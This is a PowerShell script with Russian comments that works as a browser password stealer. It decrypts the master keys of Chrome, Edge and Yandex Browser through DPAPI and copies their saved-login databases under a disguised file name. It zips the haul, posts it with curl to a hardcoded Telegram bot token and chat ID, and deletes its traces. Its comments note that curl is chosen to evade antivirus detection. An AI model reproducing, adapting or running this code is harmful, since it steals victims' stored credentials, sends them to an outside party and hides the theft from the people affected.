# [ Конфигурация ]
$t = "8453011015:AAFvYt0ZjgkUFAjtnLvONdmXl19l7GK9tfM"
$c = "806761221"
$tmp = "$env:TEMP\$( -join ((97..122) | Get-Random -Count 6 | % {[char]$_}) )"
New-Item -ItemType Directory -Path $tmp -Force > $null

Add-Type -AssemblyName System.Security

# Функция дешифровки ключа
function Get-Key($p, $l) {
    if (Test-Path $p) {
        try {
            $j = Get-Content $p -Raw | ConvertFrom-Json
            $e = [Convert]::FromBase64String($j.os_crypt.encrypted_key)
            # Снимаем защиту DPAPI
            $m = [System.Security.Cryptography.ProtectedData]::Unprotect($e[5..($e.Length-1)], $null, 0)
            "[$l] Key: $([Convert]::ToBase64String($m))" | Out-File -FilePath "$tmp\log.txt" -Append
            return $true
        } catch { return $false }
    }
    return $false
}

# 1. Сбор данных (Chromium)
$paths = @(
    @{n="CH"; p="Google\Chrome\User Data"},
    @{n="ED"; p="Microsoft\Edge\User Data"},
    @{n="YX"; p="Yandex\YandexBrowser\User Data"}
)

foreach ($b in $paths) {
    $target = Join-Path $env:LOCALAPPDATA $b.p
    if (Test-Path $target) {
        $files = Get-ChildItem -Path $target -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue
        foreach ($f in $files) {
            $label = "$($b.n)_$($f.Directory.Name)"
            if (Get-Key (Join-Path $target "Local State") $label) {
                # Копируем базу под видом .dat файла для маскировки
                Copy-Item $f.FullName -Destination "$tmp\$label.dat" -Force -ErrorAction SilentlyContinue
            }
        }
    }
}

# 2. Упаковка и скрытная отправка через curl.exe
if ((Get-ChildItem $tmp).Count -gt 0) {
    $z = "$env:TEMP\$( -join ((97..122) | Get-Random -Count 5 | % {[char]$_}) ).zip"
    Compress-Archive -Path "$tmp\*" -DestinationPath $z -Force

    # Используем curl для отправки. Это не триггерит антивирус как "PowerShell Exfiltration".
    $url = "https://api.telegram.org/bot$t/sendDocument"
    & "curl.exe" -s -X POST $url -F "chat_id=$c" -F "document=@$z" -F "caption=P81: $env:COMPUTERNAME" > $null

    if (Test-Path $z) { Remove-Item $z -Force }
}

# 3. Полная зачистка
Remove-Item -Recurse -Force $tmp -ErrorAction SilentlyContinue
